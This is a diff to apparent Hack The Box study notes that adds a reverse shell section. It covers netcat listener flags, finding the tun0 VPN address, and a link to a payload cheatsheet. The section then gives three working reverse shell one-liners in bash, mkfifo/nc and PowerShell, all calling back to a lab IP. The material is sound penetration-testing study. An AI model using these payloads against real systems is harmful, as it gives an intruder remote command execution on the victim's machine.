@@ -514,3 +514,61 @@ Target IP: 94.237.48.153:30204
 
 ## Reverse Shell
 
+### Netcat Listener
+
+```shell-session
+k3shi@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+```
+
+The flags we are using are the following:
+
+| **Flag**  | **Description**                                                                     |
+| --------- | ----------------------------------------------------------------------------------- |
+| `-l`      | Listen mode, to wait for a connection to connect to us.                             |
+| `-v`      | Verbose mode, so that we know when we receive a connection.                         |
+| `-n`      | Disable DNS resolution and only connect from/to IPs, to speed up the connection.    |
+| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |
+
+### Connect Back IP
+
+```shell
+k3shi@htb[/htb]$ ip a
+
+...SNIP...
+
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none
+    inet 10.10.10.10/23 scope global tun0
+...SNIP...
+```
+
+> [!NOTE]
+> Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.
+
+### Reverse Shell Command
+
+```cardlink
+url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+title: "PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings"
+description: "A list of useful payloads and bypass for Web Application Security and Pentest/CTF - swisskyrepo/PayloadsAllTheThings"
+host: github.com
+favicon: https://github.githubassets.com/favicons/favicon.svg
+image: https://repository-images.githubusercontent.com/71220757/c7175e80-dafd-11ea-8e0b-9c42c639ae35
+```
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
+## Bind Shell
+
